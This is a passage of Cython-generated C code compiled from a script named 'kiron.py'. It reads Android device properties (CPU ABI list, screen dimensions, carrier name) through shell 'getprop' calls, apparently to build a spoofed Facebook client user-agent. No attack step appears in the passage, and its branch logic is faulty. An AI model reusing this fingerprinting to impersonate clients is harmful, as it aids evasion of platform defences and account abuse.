  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbca, __pyx_t_3) < 0) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":87
 * fbsv = android_version
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_check_output); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 87, __pyx_L1_error)
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__126, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_kp_s_density_2_25_height, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_width); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_check_output); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 87, __pyx_L1_error)
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__127, __pyx_t_3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_replace); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbdm, __pyx_t_3) < 0) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":88
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 * try:             # <<<<<<<<<<<<<<
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 *         total = 0
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {

      /* "kiron.py":89
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')             # <<<<<<<<<<<<<<
 *         total = 0
 *         for i in fbcr:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_check_output); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 89, __pyx_L46_error)
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__118, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_split); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__120, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_t_7) < 0) __PYX_ERR(0, 89, __pyx_L46_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "kiron.py":90
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 *         total = 0             # <<<<<<<<<<<<<<
 *         for i in fbcr:
 *                 total+=1
 */
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_total, __pyx_int_0) < 0) __PYX_ERR(0, 90, __pyx_L46_error)

      /* "kiron.py":91
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 *         total = 0
 *         for i in fbcr:             # <<<<<<<<<<<<<<
 *                 total+=1
 *         select = ('1','2')
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_fbcr); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (likely(PyList_CheckExact(__pyx_t_7)) || PyTuple_CheckExact(__pyx_t_7)) {
        __pyx_t_3 = __pyx_t_7; __Pyx_INCREF(__pyx_t_3);
        __pyx_t_12 = 0;
        __pyx_t_23 = NULL;
      } else {
        __pyx_t_12 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 91, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_23 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_3); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 91, __pyx_L46_error)
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      for (;;) {
        if (likely(!__pyx_t_23)) {
          if (likely(PyList_CheckExact(__pyx_t_3))) {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_3);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 91, __pyx_L46_error)
              #endif
              if (__pyx_t_12 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_7 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_12); __Pyx_INCREF(__pyx_t_7); __pyx_t_12++; if (unlikely((0 < 0))) __PYX_ERR(0, 91, __pyx_L46_error)
            #else
            __pyx_t_7 = __Pyx_PySequence_ITEM(__pyx_t_3, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L46_error)
            __Pyx_GOTREF(__pyx_t_7);
            #endif
          } else {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_3);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 91, __pyx_L46_error)
              #endif
              if (__pyx_t_12 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_7 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_12); __Pyx_INCREF(__pyx_t_7); __pyx_t_12++; if (unlikely((0 < 0))) __PYX_ERR(0, 91, __pyx_L46_error)
            #else
            __pyx_t_7 = __Pyx_PySequence_ITEM(__pyx_t_3, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L46_error)
            __Pyx_GOTREF(__pyx_t_7);
            #endif
          }
        } else {
          __pyx_t_7 = __pyx_t_23(__pyx_t_3);
          if (unlikely(!__pyx_t_7)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 91, __pyx_L46_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_7);
        }
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_t_7) < 0) __PYX_ERR(0, 91, __pyx_L46_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        /* "kiron.py":92
 *         total = 0
 *         for i in fbcr:
 *                 total+=1             # <<<<<<<<<<<<<<
 *         select = ('1','2')
 *         if select == '1':
 */
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_total); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 92, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_8 = __Pyx_PyInt_AddObjC(__pyx_t_7, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 92, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_total, __pyx_t_8) < 0) __PYX_ERR(0, 92, __pyx_L46_error)
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

        /* "kiron.py":91
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 *         total = 0
 *         for i in fbcr:             # <<<<<<<<<<<<<<
 *                 total+=1
 *         select = ('1','2')
 */
      }
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "kiron.py":93
 *         for i in fbcr:
 *                 total+=1
 *         select = ('1','2')             # <<<<<<<<<<<<<<
 *         if select == '1':
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 */
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_select, __pyx_tuple__128) < 0) __PYX_ERR(0, 93, __pyx_L46_error)

      /* "kiron.py":94
 *                 total+=1
 *         select = ('1','2')
 *         if select == '1':             # <<<<<<<<<<<<<<
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 *                 sim_id+=fbcr
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_select); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 94, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 94, __pyx_L46_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (__pyx_t_4) {

        /* "kiron.py":95
 *         select = ('1','2')
 *         if select == '1':
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')             # <<<<<<<<<<<<<<
 *                 sim_id+=fbcr
 *         elif select == '2':
 */
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_check_output); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 95, __pyx_L46_error)
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__118, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_split); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__120, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_GetItemInt(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_replace); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_t_3) < 0) __PYX_ERR(0, 95, __pyx_L46_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

        /* "kiron.py":96
 *         if select == '1':
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 *                 sim_id+=fbcr             # <<<<<<<<<<<<<<
 *         elif select == '2':
 *                 try:
 */
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 96, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_fbcr); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 96, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_8 = PyNumber_InPlaceAdd(__pyx_t_3, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 96, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_sim_id, __pyx_t_8) < 0) __PYX_ERR(0, 96, __pyx_L46_error)
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

        /* "kiron.py":94
 *                 total+=1
 *         select = ('1','2')
 *         if select == '1':             # <<<<<<<<<<<<<<
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 *                 sim_id+=fbcr
 */
        goto __pyx_L55;
      }

      /* "kiron.py":97
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 *                 sim_id+=fbcr
 *         elif select == '2':             # <<<<<<<<<<<<<<
 *                 try:
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_select); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 97, __pyx_L46_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_4 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 97, __pyx_L46_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (__pyx_t_4) {

        /* "kiron.py":98
 *                 sim_id+=fbcr
 *         elif select == '2':
 *                 try:             # <<<<<<<<<<<<<<
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 *                         sim_id+=fbcr
 */
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_22, &__pyx_t_21, &__pyx_t_20);
          __Pyx_XGOTREF(__pyx_t_22);
          __Pyx_XGOTREF(__pyx_t_21);
          __Pyx_XGOTREF(__pyx_t_20);
          /*try:*/ {

            /* "kiron.py":99
 *         elif select == '2':
 *                 try:
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')             # <<<<<<<<<<<<<<
 *                         sim_id+=fbcr
 *                 except Exception as e:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_check_output); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 99, __pyx_L56_error)
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__118, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_decode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__120, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_GetItemInt(__pyx_t_3, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_replace); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_t_8) < 0) __PYX_ERR(0, 99, __pyx_L56_error)
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

            /* "kiron.py":100
 *                 try:
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 *                         sim_id+=fbcr             # <<<<<<<<<<<<<<
 *                 except Exception as e:
 *                         fbcr = "Zong"
 */
            __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 100, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbcr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 100, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_7 = PyNumber_InPlaceAdd(__pyx_t_8, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 100, __pyx_L56_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_sim_id, __pyx_t_7) < 0) __PYX_ERR(0, 100, __pyx_L56_error)
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

            /* "kiron.py":98
 *                 sim_id+=fbcr
 *         elif select == '2':
 *                 try:             # <<<<<<<<<<<<<<
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 *                         sim_id+=fbcr
 */
          }
          __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
